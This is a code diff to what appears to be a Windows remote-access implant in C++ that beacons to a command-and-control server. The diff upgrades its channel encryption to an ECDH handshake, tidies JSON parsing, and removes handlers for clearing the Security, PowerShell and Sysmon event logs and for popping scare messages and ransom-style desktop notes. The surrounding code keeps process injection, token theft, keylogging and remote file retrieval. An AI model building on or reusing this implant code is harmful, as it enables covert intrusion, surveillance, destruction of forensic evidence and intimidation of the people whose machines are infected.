@@ -51,26 +51,13 @@ namespace config {
 static std::wstring g_SessionId;
 static std::vector<BYTE> g_SessionKey;
 static HANDLE g_StolenToken    = NULL;  // primary token from steal_token
-static DWORD  g_BeaconOverride = 0;    // seconds; 0 = use config defaults
-static bool   g_PlaintextMode  = false; // set when the server can't do AES-GCM
+static DWORD  g_BeaconOverride = 0;     // seconds; 0 = use config defaults
 
-// Derive 32-byte key as SHA-256(sessionId)
-static std::vector<BYTE> DeriveKeyFromSessionId(const std::wstring& sessionId) {
-    std::string utf8 = WStringToUTF8(sessionId);
-    HCRYPTPROV hProv = 0;
-    HCRYPTHASH hHash = 0;
-    std::vector<BYTE> result(32, 0);
-    if (!CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
-        return result;
-    if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
-        CryptHashData(hHash, reinterpret_cast<const BYTE*>(utf8.data()), static_cast<DWORD>(utf8.size()), 0);
-        DWORD len = 32;
-        CryptGetHashParam(hHash, HP_HASHVAL, result.data(), &len, 0);
-        CryptDestroyHash(hHash);
-    }
-    CryptReleaseContext(hProv, 0);
-    return result;
-}
+// Channel state — AES-GCM is only used once the ECDH handshake has produced
+// a key. The implant holds an ephemeral P-256 keypair per run (utils.cpp);
+// the server's public point arrives in every beacon response ("spk").
+static bool        g_ChannelUp = false;
+static std::string g_SrvPubB64;          // last accepted server public point
 
 // ─── No globals for Telegram credentials – they are embedded via XSW inside functions ───
 
@@ -146,14 +133,61 @@ static std::string JsonGetString(const std::string& json, const std::string& key
     std::string raw = json.substr(start, end - start);
     std::string result;
     result.reserve(raw.size());
+
+    auto appendCodepoint = [&result](unsigned cp) {
+        if (cp < 0x80) {
+            result += static_cast<char>(cp);
+        } else if (cp < 0x800) {
+            result += static_cast<char>(0xC0 | (cp >> 6));
+            result += static_cast<char>(0x80 | (cp & 0x3F));
+        } else {
+            result += static_cast<char>(0xE0 | (cp >> 12));
+            result += static_cast<char>(0x80 | ((cp >> 6) & 0x3F));
+            result += static_cast<char>(0x80 | (cp & 0x3F));
+        }
+    };
+    auto parseHex4 = [&](size_t at, unsigned& cp) -> bool {
+        if (at + 4 > raw.size()) return false;
+        cp = 0;
+        for (size_t k = 0; k < 4; ++k) {
+            char h = raw[at + k];
+            cp <<= 4;
+            if (h >= '0' && h <= '9')      cp |= static_cast<unsigned>(h - '0');
+            else if (h >= 'a' && h <= 'f') cp |= static_cast<unsigned>(h - 'a' + 10);
+            else if (h >= 'A' && h <= 'F') cp |= static_cast<unsigned>(h - 'A' + 10);
+            else return false;
+        }
+        return true;
+    };
+
     for (size_t i = 0; i < raw.size(); ++i) {
         if (raw[i] == '\\' && i + 1 < raw.size()) {
             switch (raw[++i]) {
                 case '"':  result += '"';  break;
                 case '\\': result += '\\'; break;
+                case '/':  result += '/';  break;
+                case 'b':  result += '\b'; break;
+                case 'f':  result += '\f'; break;
                 case 'n':  result += '\n'; break;
                 case 'r':  result += '\r'; break;
                 case 't':  result += '\t'; break;
+                case 'u': {
+                    unsigned cp = 0;
+                    if (!parseHex4(i + 1, cp)) { result += 'u'; break; }
+                    i += 4;
+                    // Surrogate pair → single codepoint
+                    if (cp >= 0xD800 && cp <= 0xDBFF &&
+                        i + 6 < raw.size() &&
+                        raw[i + 1] == '\\' && raw[i + 2] == 'u') {
+                        unsigned lo = 0;
+                        if (parseHex4(i + 3, lo) && lo >= 0xDC00 && lo <= 0xDFFF) {
+                            cp = 0x10000 + ((cp - 0xD800) << 10) + (lo - 0xDC00);
+                            i += 6;
+                        }
+                    }
+                    appendCodepoint(cp);
+                    break;
+                }
                 default:   result += raw[i]; break;
             }
         } else {
@@ -161,6 +195,23 @@ static std::string JsonGetString(const std::string& json, const std::string& key
         }
     }
     return result;
+}
+
+// True when `"key":1` appears in the JSON — whitespace-tolerant, since Flask
+// pretty-prints (": 1") in debug mode and compacts (":1") in production.
+static bool JsonFlag(const std::string& json, const char* key) {
+    std::string needle = std::string("\"") + key + "\"";
+    auto pos = json.find(needle);
+    while (pos != std::string::npos) {
+        auto colon = json.find(':', pos + needle.size());
+        if (colon != std::string::npos) {
+            size_t v = colon + 1;
+            while (v < json.size() && (json[v] == ' ' || json[v] == '\t')) ++v;
+            if (v < json.size() && json[v] == '1') return true;
+        }
+        pos = json.find(needle, pos + 1);
+    }
+    return false;
 }
 
 // =====================================================================
@@ -422,17 +473,19 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
     taskOut = L"sleep";
     std::string payload = BuildBeaconJson(session);
 
-    // Payloads are AES-256-GCM encrypted with SHA256(sessionId) unless the
-    // server proved it can't do GCM (downgrade for the rest of this run).
-    std::string body = payload;
-    std::wstring extra;
-    if (!g_PlaintextMode) {
+    // The implant's ephemeral public point rides in a header on every request
+    // so the server can (re)derive the channel key at any time. The body is
+    // AES-256-GCM only once the handshake has established a shared key.
+    std::string  body  = payload;
+    std::wstring extra = L"X-Session-ID: " + session.sessionId +
+                         L"\r\nX-Pub-Key: " + UTF8ToWString(EcdhPublicKeyB64());
+    if (g_ChannelUp) {
         std::string blob = AesGcmEncrypt(g_SessionKey, payload);
         if (!blob.empty()) {
             body  = blob;
-            extra = L"X-Session-ID: " + session.sessionId + L"\r\nX-Enc: 1";
+            extra += L"\r\nX-Enc: 1";
         } else {
-            g_PlaintextMode = true;
+            g_ChannelUp = false;   // BCrypt failure — plaintext until re-handshake
         }
     }
 
@@ -440,9 +493,9 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
     HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                        L"POST", L"/beacon", body, extra);
 
-    if ((resp.status == 400 || resp.status == 401) && !g_PlaintextMode) {
-        DebugLog(L"server rejected encrypted beacon — downgrading to plaintext");
-        g_PlaintextMode = true;
+    if ((resp.status == 400 || resp.status == 401) && g_ChannelUp) {
+        DebugLog(L"server rejected encrypted beacon — re-handshaking");
+        g_ChannelUp = false;
         return FALSE;
     }
     if (resp.status != 200) {
@@ -450,16 +503,29 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
         return FALSE;
     }
 
+    // Server public point — establish/refresh the channel key BEFORE parsing
+    // the task, since the response cmd may already be encrypted with it.
+    std::string spk = JsonGetString(resp.body, "spk");
+    if (!spk.empty() && spk != g_SrvPubB64) {
+        std::vector<BYTE> key32;
+        if (EcdhDeriveSessionKey(spk, key32)) {
+            g_SessionKey = key32;
+            g_SrvPubB64  = spk;
+            g_ChannelUp  = true;
+            DebugLog(L"channel key established (ECDH P-256)");
+        } else {
+            DebugLog(L"spk derive failed — staying unencrypted this round");
+        }
+    }
+
     std::string cmd = JsonGetString(resp.body, "cmd");
     if (!cmd.empty()) {
-        // "e" is a numeric flag ({"e":1,...}) — JsonGetString can't read
-        // number values (it would grab the next quoted text), so detect the
-        // marker by substring instead.
-        if (resp.body.find("\"e\":1") != std::string::npos) {
+        if (JsonFlag(resp.body, "e")) {
             // Encrypted blob decrypts to {"cmd":"<task>"} — unpack the field.
             std::string dec = AesGcmDecrypt(g_SessionKey, cmd);
             if (dec.empty()) {
-                DebugLog(L"cmd decrypt failed — check session key");
+                DebugLog(L"cmd decrypt failed — re-handshaking");
+                g_ChannelUp = false;
                 return FALSE;
             }
             taskOut = UTF8ToWString(JsonGetString(dec, "cmd"));
@@ -478,21 +544,23 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
     std::string sid = JsonEscape(WStringToUTF8(sessionId));
     std::string out = JsonEscape(WStringToUTF8(output));
     std::string body = "{\"session\":\"" + sid + "\",\"output\":\"" + out + "\"}";
-    std::wstring extra;
-    if (!g_PlaintextMode) {
+    std::wstring extra = L"X-Session-ID: " + sessionId +
+                         L"\r\nX-Pub-Key: " + UTF8ToWString(EcdhPublicKeyB64());
+    if (g_ChannelUp) {
         std::string blob = AesGcmEncrypt(g_SessionKey, body);
         if (!blob.empty()) {
             body  = blob;
-            extra = L"X-Session-ID: " + sessionId + L"\r\nX-Enc: 1";
+            extra += L"\r\nX-Enc: 1";
         } else {
-            g_PlaintextMode = true;
+            g_ChannelUp = false;
         }
     }
     DebugLog(L"Sending result " + std::to_wstring(output.size()) + L" chars");
     HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                        L"POST", L"/result", body, extra);
-    if ((resp.status == 400 || resp.status == 401) && !g_PlaintextMode) {
-        g_PlaintextMode = true;
+    if ((resp.status == 400 || resp.status == 401) && g_ChannelUp) {
+        DebugLog(L"result rejected — re-handshaking on next beacon");
+        g_ChannelUp = false;
         return FALSE;
     }
     return (resp.status == 200);
@@ -737,42 +805,7 @@ static std::wstring HandlePs(const std::string& /*args*/) {
     CloseHandle(snap);
     return out;
 }
-static std::wstring HandleLol(const std::string& /*args*/)     { return L"[lol: not implemented]"; }
-static std::wstring HandleExfil(const std::string& /*args*/)   { return L"[exfil: not implemented]"; }
-static std::wstring HandleWipe(const std::string& /*args*/) {
-    static const wchar_t* kLogs[] = {
-        L"System", L"Security", L"Application",
-        L"Microsoft-Windows-PowerShell/Operational",
-        L"Microsoft-Windows-Sysmon/Operational",
-        nullptr
-    };
-    wchar_t sysRoot[MAX_PATH] = {};
-    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
-    std::wstring wevtutil = std::wstring(sysRoot) + L"\\System32\\wevtutil.exe";
-    std::wstring out;
-    for (int i = 0; kLogs[i]; ++i) {
-        std::wstring cmd = L"\"" + wevtutil + L"\" cl \"" + std::wstring(kLogs[i]) + L"\"";
-        STARTUPINFOW si = {};
-        PROCESS_INFORMATION pi = {};
-        si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
-        if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
-                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
-            WaitForSingleObject(pi.hProcess, 5000);
-            DWORD exitCode = 1;
-            GetExitCodeProcess(pi.hProcess, &exitCode);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            out += std::wstring(kLogs[i]) + (exitCode == 0 ? L": cleared\n" : L": failed (access denied?)\n");
-        } else {
-            out += std::wstring(kLogs[i]) + L": spawn failed\n";
-        }
-    }
-    return L"[+] Log wipe complete:\n" + out;
-}
-static std::wstring HandleLateral(const std::string& /*args*/) { return L"[lateral: not implemented]"; }
-static std::wstring HandleCreds(const std::string& /*args*/)   { return L"[creds: not implemented]"; }
+
 static std::wstring HandleDownload(const std::string& args) {
     size_t sp = args.find(' ');
     if (sp == std::string::npos) return L"Usage: download <url> <dest>";
@@ -1249,221 +1282,6 @@ static std::wstring HandlePsReset(const std::string&) {
     return PsSpawn() ? L"[+] PowerShell session restarted" : L"[error: restart failed]";
 }
 
-// ─── Visibility demo — wallpaper + desktop note (fully reversible) ───────────
-// !prank <text>   swap wallpaper to the embedded image, drop READ_ME.txt on
-//                 the desktop, pop it in Notepad
-// !prank off      restore the original wallpaper and remove the note
-static bool WriteResourceToFile(UINT resId, const wchar_t* dest) {
-    HRSRC hr = FindResourceW(nullptr, MAKEINTRESOURCEW(resId), RT_RCDATA);
-    if (!hr) return false;
-    HGLOBAL hg = LoadResource(nullptr, hr);
-    if (!hg) return false;
-    const BYTE* data = static_cast<const BYTE*>(LockResource(hg));
-    DWORD size = SizeofResource(nullptr, hr);
-    if (!data || !size) return false;
-    HANDLE hf = CreateFileW(dest, GENERIC_WRITE, 0, nullptr,
-                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (hf == INVALID_HANDLE_VALUE) return false;
-    DWORD wr = 0;
-    WriteFile(hf, data, size, &wr, nullptr);
-    CloseHandle(hf);
-    return wr == size;
-}
-
-static std::wstring HandlePrank(const std::string& args) {
-    wchar_t pub[MAX_PATH] = {};
-    if (!GetEnvironmentVariableW(L"PUBLIC", pub, MAX_PATH))
-        lstrcpyW(pub, L"C:\\Users\\Public");
-    std::wstring wallPath = std::wstring(pub) + L"\\ghost_wall.jpg";
-    std::wstring origPath = std::wstring(pub) + L"\\ghost_wall_orig.txt";
-
-    // Restore mode — put the original wallpaper back and clean up.
-    if (args == "off") {
-        HANDLE hf = CreateFileW(origPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
-                                nullptr, OPEN_EXISTING, 0, nullptr);
-        if (hf == INVALID_HANDLE_VALUE) return L"[error: no saved wallpaper to restore]";
-        wchar_t orig[260] = {}; DWORD rd = 0;
-        ReadFile(hf, orig, sizeof(orig) - 2, &rd, nullptr);
-        CloseHandle(hf);
-        if (!orig[0]) return L"[error: saved wallpaper path is empty]";
-        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (LPVOID)orig,
-                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-        wchar_t desk[MAX_PATH] = {};
-        SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desk);
-        DeleteFileW((std::wstring(desk) + L"\\READ_ME.txt").c_str());
-        DeleteFileW(origPath.c_str());
-        DeleteFileW(wallPath.c_str());
-        return L"[+] wallpaper restored, note removed";
-    }
-
-    // Save the current wallpaper once, so `off` can restore it later.
-    if (GetFileAttributesW(origPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
-        wchar_t cur[260] = {}; DWORD sz = sizeof(cur) - 2;
-        RegGetValueW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"Wallpaper",
-                     RRF_RT_REG_SZ, nullptr, cur, &sz);
-        HANDLE hf = CreateFileW(origPath.c_str(), GENERIC_WRITE, 0, nullptr,
-                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (hf != INVALID_HANDLE_VALUE) {
-            DWORD w = 0;
-            WriteFile(hf, cur, static_cast<DWORD>(wcslen(cur) * 2), &w, nullptr);
-            CloseHandle(hf);
-        }
-    }
-
-    if (!WriteResourceToFile(100, wallPath.c_str()))
-        return L"[error: wallpaper resource missing]";
-    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, &wallPath[0],
-                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-
-    // Desktop note — UTF-16 LE with BOM so Notepad renders it cleanly.
-    wchar_t desk[MAX_PATH] = {};
-    SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desk);
-    std::wstring note = std::wstring(desk) + L"\\READ_ME.txt";
-    std::wstring text = UTF8ToWString(args);
-    if (text.empty())
-        text = L"YOUR DEVICE HAS BEEN OWNED.\r\nAll access was logged.\r\n\r\n- @kalidada";
-    HANDLE hf = CreateFileW(note.c_str(), GENERIC_WRITE, 0, nullptr,
-                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (hf == INVALID_HANDLE_VALUE)
-        return L"[+] wallpaper set, but the note write failed";
-    BYTE bom[2] = { 0xFF, 0xFE };
-    DWORD w = 0;
-    WriteFile(hf, bom, 2, &w, nullptr);
-    WriteFile(hf, text.c_str(), static_cast<DWORD>(text.size() * 2), &w, nullptr);
-    CloseHandle(hf);
-
-    // Pop the note in Notepad for immediate visibility.
-    std::wstring np = L"notepad.exe \"" + note + L"\"";
-    STARTUPINFOW si = {}; si.cb = sizeof(si);
-    PROCESS_INFORMATION pi = {};
-    if (CreateProcessW(nullptr, &np[0], nullptr, nullptr, FALSE, 0,
-                       nullptr, nullptr, &si, &pi)) {
-        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-    }
-    return L"[+] wallpaper set, READ_ME.txt on desktop — !prank off to revert";
-}
-
-// ─── Random popup chaos (visibility demo) ────────────────────────────────────
-// !popups      open/close random scare popups at random screen positions
-// !popups off  stop the loop and close whatever is open
-static HANDLE g_popThread = nullptr;
-static volatile LONG g_popRunning = 0;
-static HANDLE g_lastPopProc = nullptr;
-static HWND   g_lastPopWnd  = nullptr;
-
-static const wchar_t* kPopTexts[] = {
-    L"SYSTEM COMPROMISED\n\nEvery keystroke is being logged.",
-    L"REMOTE ACCESS ACTIVE\n\n@kalidada is watching this screen.",
-    L"ALERT: Camera and microphone are ON.",
-    L"Your files are being copied right now.\nDo not turn off the computer.",
-    L"CONNECTION INTERCEPTED\n\nAll saved passwords have been exported.",
-    L"This machine belongs to @kalidada now.",
-    L"Data exfiltration in progress… 67%",
-    L"Firewall: OFF    Antivirus: BYPASSED\nYou are on your own.",
-};
-
-static DWORD PopRand(DWORD lo, DWORD hi) {
-    static std::mt19937 gen(static_cast<unsigned>(
-        std::random_device{}() ^ GetCurrentProcessId()));
-    return lo + gen() % (hi - lo + 1);
-}
-
-static BOOL CALLBACK MovePopWnd(HWND hwnd, LPARAM pid) {
-    DWORD wid = 0;
-    GetWindowThreadProcessId(hwnd, &wid);
-    if (wid == static_cast<DWORD>(pid)) {
-        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
-        SetWindowPos(hwnd, HWND_TOPMOST,
-                     static_cast<int>(PopRand(0, sw > 500 ? sw - 500 : 100)),
-                     static_cast<int>(PopRand(0, sh > 350 ? sh - 350 : 100)),
-                     0, 0, SWP_NOSIZE | SWP_NOZORDER);
-        g_lastPopWnd = hwnd;
-        return FALSE;
-    }
-    return TRUE;
-}
-
-static DWORD WINAPI PopupThread(LPVOID) {
-    DebugLog(L"[pop] thread started");
-    wchar_t pub[MAX_PATH] = {};
-    if (!GetEnvironmentVariableW(L"PUBLIC", pub, MAX_PATH))
-        lstrcpyW(pub, L"C:\\Users\\Public");
-    std::wstring notePath = std::wstring(pub) + L"\\ghost_pop.txt";
-
-    while (InterlockedCompareExchange(&g_popRunning, 0, 0)) {
-        // random idle gap — deadline-based so it can't wrap, sliced so
-        // '!popups off' reacts within ~200 ms
-        DebugLog(L"[pop] idle start");
-        DWORD idleMs = PopRand(2500, 8000);
-        DWORD idleDeadline = GetTickCount() + idleMs;
-        while (g_popRunning &&
-               static_cast<int>(idleDeadline - GetTickCount()) > 0)
-            Sleep(200);
-        DebugLog(L"[pop] idle done, opening popup");
-        if (!g_popRunning) break;
-
-        const wchar_t* txt = kPopTexts[PopRand(0, ARRAYSIZE(kPopTexts) - 1)];
-        HANDLE hf = CreateFileW(notePath.c_str(), GENERIC_WRITE, 0, nullptr,
-                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (hf == INVALID_HANDLE_VALUE) { DebugLog(L"[pop] note write FAILED"); break; }
-        BYTE bom[2] = { 0xFF, 0xFE }; DWORD w = 0;
-        WriteFile(hf, bom, 2, &w, nullptr);
-        WriteFile(hf, txt, static_cast<DWORD>(wcslen(txt) * 2), &w, nullptr);
-        CloseHandle(hf);
-
-        std::wstring cmd = L"notepad.exe \"" + notePath + L"\"";
-        STARTUPINFOW si = {}; si.cb = sizeof(si);
-        PROCESS_INFORMATION pi = {};
-        if (!CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, 0,
-                            nullptr, nullptr, &si, &pi)) {
-            DebugLog(L"[pop] CreateProcess FAILED err=" + std::to_wstring(GetLastError()));
-            break;
-        }
-        DebugLog(L"[pop] notepad spawned");
-        if (g_lastPopProc) CloseHandle(g_lastPopProc);
-        g_lastPopProc = pi.hProcess;
-        g_lastPopWnd  = nullptr;
-
-        Sleep(350);  // let the window materialize
-        if (g_popRunning)
-            EnumWindows(MovePopWnd, static_cast<LPARAM>(pi.dwProcessId));
-
-        // random lifetime, then close
-        DWORD lifeDeadline = GetTickCount() + PopRand(2000, 6000);
-        while (g_popRunning &&
-               static_cast<int>(lifeDeadline - GetTickCount()) > 0)
-            Sleep(200);
-        if (g_lastPopWnd) PostMessageW(g_lastPopWnd, WM_CLOSE, 0, 0);
-        if (WaitForSingleObject(pi.hProcess, 800) == WAIT_TIMEOUT)
-            TerminateProcess(pi.hProcess, 0);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        if (g_lastPopProc == pi.hProcess) { g_lastPopProc = nullptr; g_lastPopWnd = nullptr; }
-    }
-    return 0;
-}
-
-static std::wstring HandlePopups(const std::string& args) {
-    if (args == "off") {
-        if (!g_popRunning) return L"[popups: not running]";
-        InterlockedExchange(&g_popRunning, 0);
-        if (g_popThread) {
-            WaitForSingleObject(g_popThread, 10000);
-            CloseHandle(g_popThread);
-            g_popThread = nullptr;
-        }
-        if (g_lastPopWnd)  PostMessageW(g_lastPopWnd, WM_CLOSE, 0, 0);
-        if (g_lastPopProc) { TerminateProcess(g_lastPopProc, 0); CloseHandle(g_lastPopProc); g_lastPopProc = nullptr; }
-        g_lastPopWnd = nullptr;
-        return L"[+] popups stopped";
-    }
-    if (g_popRunning) return L"[popups: already running — !popups off to stop]";
-    InterlockedExchange(&g_popRunning, 1);
-    g_popThread = CreateThread(nullptr, 0, PopupThread, nullptr, 0, nullptr);
-    if (!g_popThread) { InterlockedExchange(&g_popRunning, 0); return L"[error: thread failed]"; }
-    return L"[+] random popups running — !popups off to stop";
-}
-
 // =====================================================================
 //  KILL PROCESS
 // =====================================================================
@@ -1513,14 +1331,9 @@ struct CmdEntry {
 
 static const CmdEntry kCmdTable[] = {
     { "!ps ",          false, HandlePs },
-    { "!lol ",         false, HandleLol },
     { "!inject-apc ",  false, HandleInjectApc },
     { "!inject ",      false, HandleInject },
     { "!migrate ",     false, HandleMigrate },
-    { "!exfil ",       false, HandleExfil },
-    { "!wipe",         false, HandleWipe },
-    { "!lateral ",     false, HandleLateral },
-    { "!creds",        true,  HandleCreds },
     { "ps",            true,  HandlePs },
     { "ps1 ",          false, HandlePsLine },
     { "psreset",       true,  HandlePsReset },
@@ -1529,10 +1342,6 @@ static const CmdEntry kCmdTable[] = {
     { "!files",        true,  HandleFiles },
     { "!files ",       false, HandleFiles },
     { "!getfile ",     false, HandleGetFile },
-    { "!prank ",       false, HandlePrank },
-    { "!prank",        true,  HandlePrank },
-    { "!popups",       true,  HandlePopups },
-    { "!popups ",      false, HandlePopups },
     { "!uninstall",    true,  HandleUninstall },
     { "steal_token",   true,  HandleStealToken },
     { "keylog_start",  true,  HandleKeylogStart },
@@ -1732,8 +1541,8 @@ BOOL PingC2() {
 DWORD BeaconLoop(const Session& session) {
     DebugLog(L"BeaconLoop started");
 
-    g_SessionId  = session.sessionId;
-    g_SessionKey = DeriveKeyFromSessionId(session.sessionId);
+    g_SessionId = session.sessionId;
+    EcdhInit();   // fresh ephemeral keypair per run — key set by first beacon's handshake
     DebugLog(L"Session: " + session.sessionId);
 
     DWORD failures    = 0;
